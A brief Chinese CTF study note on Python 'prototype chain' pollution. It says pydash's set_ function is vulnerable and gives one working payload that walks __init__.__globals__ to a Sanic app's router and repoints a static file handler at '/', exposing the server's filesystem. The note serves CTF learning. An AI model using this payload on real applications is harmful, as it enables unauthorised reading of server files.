tags:: CTFWEB/Python/Python的原型链污染

- # 介绍
	- pydash的`_set`函数存在原型链污染漏洞
	- 示例
		- ```python
		  pydash.set_(pollute, "__init__.__globals__.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory", "/")
		  ```